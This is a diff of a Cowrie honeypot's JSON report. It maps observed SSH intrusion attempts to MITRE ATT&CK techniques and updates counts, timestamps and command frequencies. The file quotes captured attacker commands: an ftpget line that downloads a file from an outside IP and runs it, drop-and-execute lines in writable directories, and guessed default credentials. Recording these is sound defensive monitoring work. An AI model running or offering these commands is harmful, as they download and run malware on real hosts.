@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-14 11:01:26",
+  "generated": "2026-08-14 12:02:42",
   "totals": {
-    "commands": 584,
-    "login_failed": 1994,
-    "login_success": 45,
-    "sessions": 2231
+    "commands": 675,
+    "login_failed": 2282,
+    "login_success": 52,
+    "sessions": 2494
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1994,
+      "count": 2282,
       "examples": [
         "dispatch-sjjr / dispatch-sjjr",
         "root / 123321",
@@ -21,14 +21,14 @@
         "root / 12345"
       ],
       "first": "2026-08-14T00:01:53.440937Z",
-      "last": "2026-08-14T10:52:05.534754Z",
-      "unique_ips": 50
+      "last": "2026-08-14T11:53:13.366976Z",
+      "unique_ips": 54
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 128,
+      "count": 132,
       "examples": [
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,14 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T10:32:37.066611Z",
+      "last": "2026-08-14T11:46:28.356740Z",
       "unique_ips": 14
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 45,
+      "count": 52,
       "examples": [
         "ubuntu / 123456",
         "enable\\x00 / linuxshell\\x00",
@@ -53,8 +53,8 @@
         "root / root"
       ],
       "first": "2026-08-14T00:11:55.270801Z",
-      "last": "2026-08-14T10:33:58.368577Z",
-      "unique_ips": 34
+      "last": "2026-08-14T12:02:06.789135Z",
+      "unique_ips": 37
     },
     {
       "id": "T1105",
@@ -76,7 +76,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 9,
+      "count": 12,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -84,8 +84,8 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-14T00:12:07.783870Z",
-      "last": "2026-08-14T10:34:16.672907Z",
-      "unique_ips": 8
+      "last": "2026-08-14T12:02:19.086021Z",
+      "unique_ips": 11
     },
     {
       "id": "T1033",
@@ -181,23 +181,23 @@
     ],
     [
       "system",
-      20
+      24
     ],
     [
       "shell",
-      20
+      24
     ],
     [
       "sh",
-      20
+      24
     ],
     [
       "enable",
-      16
+      20
     ],
     [
       "linuxshell",
-      13
+      17
     ],
     [
       "ping ;sh",
@@ -216,44 +216,44 @@
       8
     ],
     [
-      "busybox",
-      7
-    ],
-    [
-      "/bin/busybox UNSTABLE",
-      4
-    ],
-    [
       ">/tmp/.codi && cd /tmp/",
-      4
+      8
     ],
     [
       ">/var/.codi && cd /var/",
-      4
+      8
     ],
     [
       ">/dev/.codi && cd /dev/",
-      4
+      8
     ],
     [
       ">/mnt/.codi && cd /mnt/",
-      4
+      8
     ],
     [
       ">/var/run/.codi && cd /var/run/",
-      4
+      8
     ],
     [
       ">/var/tmp/.codi && cd /var/tmp/",
-      4
+      8
     ],
     [
       ">/.codi && cd /",
-      4
+      8
     ],
     [
       ">/dev/netslink/.codi && cd /dev/netslink/",
-      4
+      8
+    ],
+    [
+      ">/dev/shm/.codi && cd /dev/shm/",
+      8
+    ],
+    [
+      ">/bin/.codi && cd /bin/",
+      8
     ]
   ]
 }
